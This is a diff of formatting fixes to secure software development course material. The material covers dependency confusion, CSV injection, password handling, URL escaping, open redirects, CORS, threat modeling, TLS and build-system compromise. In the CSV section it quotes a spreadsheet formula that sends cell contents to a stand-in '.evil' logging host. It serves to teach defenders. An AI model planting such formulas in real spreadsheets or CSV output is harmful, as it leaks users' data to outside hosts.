@@ -1246,7 +1246,7 @@ You also need to ensure that your system is not vulnerable to a “dependency co
 🔔 Dependency confusion is a special case of 2021 CWE Top 25 #34, *Uncontrolled Search Path Element* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)). Relying on plugins, libraries, or modules from untrusted sources, and relying on untrustworthy content delivery networks, is considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*.
 
 
-##e Quiz 3.2
+## Quiz 3.2
 
 \>\>What are good ways to acquire software? Select all answers that apply.<<
 
@@ -1306,7 +1306,7 @@ This is false. Sure, there are risks when reusing software, but there are risks 
 
 # Part I Final Exam
 
-*  Not included as part of the free version of the course.
+* Not included as part of the free version of the course.
 
 # Part II: Implementation
 
@@ -1769,7 +1769,7 @@ Although this is potentially a big topic, in practice, the key is often to use a
 
 The “comma separated value” (CSV) format is in theory simple. Every line is a record, where fields are separated by commas. The first line is usually a “header line” - the field names separated by commas (you should always provide the header, since this makes the CSV file more extensible and much easier to handle with other tools).
 
-In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with “**=**” is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents “**=IMPORTXML(CONCAT(“"http://some-server-with-log.evil?v="”, CONCATENATE(A2:E2)), “"//a"”)**” will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.
+In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with “**=**” is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents “**=IMPORTXML(CONCAT(“"<http://some-server-with-log.evil?v>="”, CONCATENATE(A2:E2)), “"//a"”)**” will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.
 
 When reading these formats from an untrusted source, ensure that each cell meets the expected data format, and don’t pass on the data otherwise. Be especially wary of cells beginning with “**=**”, and try to avoid passing them on, since some tools may execute their contents.
 
@@ -1810,6 +1810,7 @@ Of course, if something requires authorization, that means there should first ha
 You should typically first do input validation of an identity (such as a username or email address), before doing anything else with it, to reduce the likelihood of an attacker subverting a system through its login system. In most cases you should only report “login failed” (or similar) if the combination of the identity and the authentication (such as a password) failed; don’t reveal if the identity exists in the system, since that lets the attacker know if the identity is present on the system. You should support multi-factor authentication (MFA) logins, either directly or via a service, since these tend to be stronger than passwords.
 
 If you do support passwords for authentication, follow good practices, e.g.:
+
 1. Make sure that no more than 1 character of a password is displayed to a user at a time, to reduce the risk of someone else being able to see the password (aka “shoulder surfing”). You can do this in HTML input fields by using the input type `password`.
 2. Ensure that users can use password managers when logging in, creating a password, or changing a password. For example, ensure that users can copy text into the password fields, as this functionality is necessary for some password managers. Forcing users to manually type passwords encourages them to use poor passwords and discourages them from using a password manager (which is considered best practice by many).
 3. When creating or changing a password, ask the user to enter the old password. This prevents an attacker from easily changing the password if they have brief control of the account. Also, ask the user to enter a new password twice and verify that they are the same, to ensure that the intended password will be used as the password. This also verifies that a password manager (if any) is sending the password consistently.
@@ -3206,7 +3207,7 @@ In that case, where possible, use libraries *already designed* to allow only wha
 
 We have focused on escaping HTML, because that is the biggest problem in web applications. But HTML can embed other kinds of data, and of those, perhaps the most common are URLs.
 
-Embedded URLs must also be escaped, and the rules for escaping URLs are different. The URL syntax is generally **scheme:[//authority]path[?query][#fragment]**. For example, in the URL **&lt;https://www.linuxfoundation.org/about/&gt;**, the scheme is “**https**”, authority “<b>www.linuxfoundation.org</b>”, path is “**/about/**”, and this example has no query or fragment part. Sometimes you need special characters in the path, query, or fragment. The conventional way to escape those parts of the URLs is to first ensure the data is encoded with UTF-8, and escape as “**%hh**” (where **hh** is the hexadecimal representation) all bytes except for “safe” bytes, which are typically **A-Z**, **a-z**, **0-9**, “**.**”, “**-**”, “**&#42;**”, and “**&#95;**”. The Java routine **java.net.URLEncoder.encode()** turns all spaces into “**+**” instead of “**%20**”; both the “**+**” and “**%20**” conventions are in wide use.
+Embedded URLs must also be escaped, and the rules for escaping URLs are different. The URL syntax is generally **scheme&#58;[//authority]path[?query][#fragment]**. For example, in the URL **<https://www.linuxfoundation.org/about/>**, the scheme is “**https**”, authority “<b>www.linuxfoundation.org</b>”, path is “**/about/**”, and this example has no query or fragment part. Sometimes you need special characters in the path, query, or fragment. The conventional way to escape those parts of the URLs is to first ensure the data is encoded with UTF-8, and escape as “**%hh**” (where **hh** is the hexadecimal representation) all bytes except for “safe” bytes, which are typically **A-Z**, **a-z**, **0-9**, “**.**”, “**-**”, “**&#42;**”, and “**&#95;**”. The Java routine **java.net.URLEncoder.encode()** turns all spaces into “**+**” instead of “**%20**”; both the “**+**” and “**%20**” conventions are in wide use.
 
 #### XSS Alternatives
 
@@ -3436,21 +3437,21 @@ The [OWASP cheat sheet on unvalidated redirects and forwards](https://cheatsheet
 
 * *Where possible, have the user provide [a] short name, ID or token which is mapped server-side to a full target URL.*
 
-    * *This provides the highest degree of protection against the attack tampering with the URL.*
+  * *This provides the highest degree of protection against the attack tampering with the URL.*
 
-    * *Be careful that this doesn’t introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets*
+  * *Be careful that this doesn’t introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets*
 
 * *If user input can’t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.*
 
 * *Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).*
 
-    * *This should be based on an allowlist approach, rather than a denylist.”*
+  * *This should be based on an allowlist approach, rather than a denylist.”*
 
 🔔 Open redirects are such a common cause of security vulnerabilities that this weakness is 2021 CWE Top 25 #37 and 2019 CWE Top 25 #32. It is [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 
 ### Quiz 4.7
 
-\>\>It is fine to support a redirector URL, e.g., **https://bank.example.com/redirect?url=https://dangerous.example.com**, as long as the URL is carefully sanitized to only allow trusted URLs. True or False?<<
+\>\>It is fine to support a redirector URL, e.g., **<https://bank.example.com/redirect?url=https://dangerous.example.com>**, as long as the URL is carefully sanitized to only allow trusted URLs. True or False?<<
 
 (x) True
 
@@ -3540,7 +3541,7 @@ When a web browser gets an HTML file, the HTML file is allowed to freely refer t
 
 However, when a web browser retrieves and runs a script (such as JavaScript), it would be dangerous for the web browser to allow that script to easily interact with arbitrary websites. If that were allowed, a malicious script could surreptitiously send private data to any other site, and the script could also attack other websites (e.g., by exploiting vulnerabilities or launching a DDoS attack).
 
-To prevent many security problems, web browsers normally enforce on client-side JavaScript programs a set of rules called the *same-origin policy*. Under the same-origin policy, client-side JavaScript programs are only allowed to interact with the same *origin*, including viewing any resources. The origin of a URL is the combination of the protocol (usually https), port (443 by default for https), and host. Thus, **https://example.com/foo** and **https://example.com/bar** are considered to have the same origin because they have the combination (https, 443, example.com). The purpose of the same-origin policy is to isolate potentially malicious documents (Mozilla, [*Same-Origin Policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).
+To prevent many security problems, web browsers normally enforce on client-side JavaScript programs a set of rules called the *same-origin policy*. Under the same-origin policy, client-side JavaScript programs are only allowed to interact with the same *origin*, including viewing any resources. The origin of a URL is the combination of the protocol (usually https), port (443 by default for https), and host. Thus, **<https://example.com/foo>** and **<https://example.com/bar>** are considered to have the same origin because they have the combination (https, 443, example.com). The purpose of the same-origin policy is to isolate potentially malicious documents (Mozilla, [*Same-Origin Policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).
 
 The same-origin policy prevents many security issues, but it is sometimes too strict. A website can specifically allow interaction by JavaScript from other origins by using Cross-Origin Resource Sharing (CORS). CORS can be useful, since it relaxes the restrictions of the same-origin policy. CORS can also be a problem, since CORS can enable vulnerabilities if it is poorly used. CORS is specified in great detail in the [WHATWG Fetch specification](https://fetch.spec.whatwg.org/#http-extensions). Mozilla has a nice description of CORS in their [documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). In this unit, we will briefly cover the highlights, summarizing some of the material from the Mozilla CORS documentation.
 
@@ -3570,9 +3571,9 @@ Sometimes the information may vary depending on the origin of the requestor (thi
 
 Details on how to enable CORS for a large variety of circumstances is available at [enable-cors.org](https://enable-cors.org/). You can also check out the following resources for more details:
 
-* [Web Hypertext Application Technology Working Group (WHATWG). ](https://fetch.spec.whatwg.org/)[*Fetch*](https://fetch.spec.whatwg.org/)
+* [Web Hypertext Application Technology Working Group (WHATWG).](https://fetch.spec.whatwg.org/)[*Fetch*](https://fetch.spec.whatwg.org/)
 
-* [Mozilla’s ](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[*Same-origin policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[ documentation](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
+* [Mozilla’s](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[*Same-origin policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[documentation](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
 
 * [Mozilla’s Cross-Origin Resource Sharing (CORS) documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).
 
@@ -4126,15 +4127,15 @@ An easy design-centric approach is one developed by Microsoft called STRIDE. We 
 
 Microsoft recommends doing the following steps for any threat modeling (attack modeling) approach ([Microsoft Threat Modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)):
 
-1.  Define security requirements.
+1. Define security requirements.
 
-2.  Create an application diagram.
+2. Create an application diagram.
 
-3.  Identify threats.
+3. Identify threats.
 
-4.  Mitigate threats.
+4. Mitigate threats.
 
-5.  Validate that threats have been mitigated.
+5. Validate that threats have been mitigated.
 
 When applying STRIDE in step 2, you need to create a simple representation of your design. Typically, this is done by creating a simple data flow diagram (DFD) (for more details, see [*Threat Modeling: 12 Available Methods*](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), by Nataliya Shevchenko, 2018):
 
@@ -4526,7 +4527,7 @@ When clients connect to a server using TLS, the client normally needs to check t
 
 TLS, as a protocol, combines many of the pieces we have discussed. At the beginning of communication, the two sides must negotiate to determine the set of algorithms (including key lengths) that will be used for its connection. This set of algorithms is called the *ciphersuite*. That means that, for security, it is important to have good default configurations and to have the software configured correctly when deploying it.
 
-If you are configuring an HTTPS site, a great place to get currently-recommended settings is [Mozilla’s ](https://wiki.mozilla.org/Security/Server_Side_TLS) [*Security/Server Side TLS*](https://wiki.mozilla.org/Security/Server_Side_TLS)[ site](https://wiki.mozilla.org/Security/Server_Side_TLS). A key decision for you to make is if you want the modern, intermediate, or old configuration:
+If you are configuring an HTTPS site, a great place to get currently-recommended settings is [Mozilla’s](https://wiki.mozilla.org/Security/Server_Side_TLS) [*Security/Server Side TLS*](https://wiki.mozilla.org/Security/Server_Side_TLS)[site](https://wiki.mozilla.org/Security/Server_Side_TLS). A key decision for you to make is if you want the modern, intermediate, or old configuration:
 
 * Modern: Most secure, but a non-trivial number of clients might not be able to connect to it.
 
@@ -4904,7 +4905,7 @@ Many builds are reproducible without any changes, however, some are not. The fir
 More information on how to create reproducible builds is available; see [“Documentation” from the Reproducible Builds project](https://reproducible-builds.org/docs/).
 
 😱 STORY TIME: Subversion of SolarWinds Orion’s Build System
-Orion is an enterprise network management software suite from SolarWinds that includes performance and application monitoring as well as network configuration management. In 2020 a threat actor modified the Orion build system so that built versions of Orion would include malicious code. This subverted built system was then signed by the legitimate SolarWinds code signing certificate. This subversion was very damaging; the US government’s Cybersecurity & Infrastructure Security Agency (CISA) even issued an emergency directive (“[Emergency Directive 21-01]](https://www.cisa.gov/emergency-directive-21-01)” from CISA). Many security countermeasures couldn’t work in this case; “review code” didn’t work (the change was inserted by the build system and thus not seen by its developers), “check for signatures” didn’t work (it was legitimately signed), and monitoring for problems did not work for a while (because in many organizations this was the monitoring system). For more information, see [Alert AA20-352A](https://www.cisa.gov/emergency-directive-21-01) from CISA and “[Preventing Supply Chain Attacks like SolarWinds](https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/)” by David A. Wheeler.
+Orion is an enterprise network management software suite from SolarWinds that includes performance and application monitoring as well as network configuration management. In 2020 a threat actor modified the Orion build system so that built versions of Orion would include malicious code. This subverted built system was then signed by the legitimate SolarWinds code signing certificate. This subversion was very damaging; the US government’s Cybersecurity & Infrastructure Security Agency (CISA) even issued an emergency directive (“[Emergency Directive 21-01]](<https://www.cisa.gov/emergency-directive-21-01>)” from CISA). Many security countermeasures couldn’t work in this case; “review code” didn’t work (the change was inserted by the build system and thus not seen by its developers), “check for signatures” didn’t work (it was legitimately signed), and monitoring for problems did not work for a while (because in many organizations this was the monitoring system). For more information, see [Alert AA20-352A](https://www.cisa.gov/emergency-directive-21-01) from CISA and “[Preventing Supply Chain Attacks like SolarWinds](https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/)” by David A. Wheeler.
 
 🔔 Hardening the CI/CD pipeline against unauthorized access, malicious code, or system compromise is part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*.
 
@@ -4930,13 +4931,13 @@ When fielding/deploying:
 
 * Configure your production environment to be secure, including all components you depend on, and keep it updated. For example:
 
-    * Your environment should be configured to provide least privilege and use maximum security settings your system allows.
+  * Your environment should be configured to provide least privilege and use maximum security settings your system allows.
 
-    * Beware of *“insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information”* (as OWASP notes).
+  * Beware of *“insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information”* (as OWASP notes).
 
-    * Harden your environment by maximally enabling security countermeasures and eliminating unused components (so their vulnerabilities cannot be exploited). These components include your operating systems, database systems, virtual machine monitor, virtual machines, container runtime infrastructure, containers, and anything else you use or depend on. There are many documents that discuss how to harden various components; use them!
+  * Harden your environment by maximally enabling security countermeasures and eliminating unused components (so their vulnerabilities cannot be exploited). These components include your operating systems, database systems, virtual machine monitor, virtual machines, container runtime infrastructure, containers, and anything else you use or depend on. There are many documents that discuss how to harden various components; use them!
 
-    * Where it is reasonable, enable automatic updates.
+  * Where it is reasonable, enable automatic updates.
 
 * Avoid giving direct access to your database unless it is necessary *and* you have verified it is secure.
 
@@ -5025,16 +5026,16 @@ That said, there are many kinds of potential attacks on ML systems, including:
   An attacker may be able to use query results to reveal hidden information.
   Thus, this kind of attack may lead to a loss of confidentiality.
   This kind of attack can be subdivided further, for example:
-    * *Extraction*.
+  * *Extraction*.
       In an extraction attack, the attacker extracts the parameters or
       structure of the model from observations of the model’s predictions
       (Tabassi 2019).
-    * *(Membership) inference*.
+  * *(Membership) inference*.
       In a membership inference attack, the attacker
       uses target model query results to determine if specific
       data points belong to the same distribution as the training dataset
       (Tabassi 2019).
-    * *(Model) inversion*.
+  * *(Model) inversion*.
       In an inversion attack, the attacker is able to
       reconstruct (some) data used to train the model, including
       private and/or secret data (Tabassi 2019).
@@ -5233,9 +5234,9 @@ Some tools are also designed to verify that claims are mathematically true. Majo
 
 * *Theorem-provers*<br>These try to prove goals given assumptions using only a sequence of allowed rules. Some are fully automated while others are interactive. The interactive tools can handle harder problems but are generally harder to use.
 
-    * Widely-used OSS automated theorem provers include E and SPASS.
+  * Widely-used OSS automated theorem provers include E and SPASS.
 
-    * Widely-used OSS interactive theorem provers include Coq and Isabelle.
+  * Widely-used OSS interactive theorem provers include Coq and Isabelle.
 
 * *Satisfiability (SAT) solvers / SAT modulo theories (SMT)*<br>These take a bunch of equations with variables, and try to find a set of values for those variables that makes all equations true. SAT solvers only handle boolean variables and boolean equations, while SMT solvers can handle other values. Some package managers internally use a SAT solver. Widely-used OSS SMT solvers include Z3, CVC4, and Alt-Ergo-Free.
 
@@ -6153,7 +6154,7 @@ Tabassi, Elham (NIST), Kevin Burns (MITRE), Michael Hadjimichael (MITRE), Andres
 A Taxonomy and Terminology of Adversarial Machine Learning
 NISTIR 8269 (Draft),
 October 2019
-https://csrc.nist.gov/publications/detail/nistir/8269/draft
+<https://csrc.nist.gov/publications/detail/nistir/8269/draft>
 
 The Fuzzing Project ([https://fuzzing-project.org/](https://fuzzing-project.org/))
 
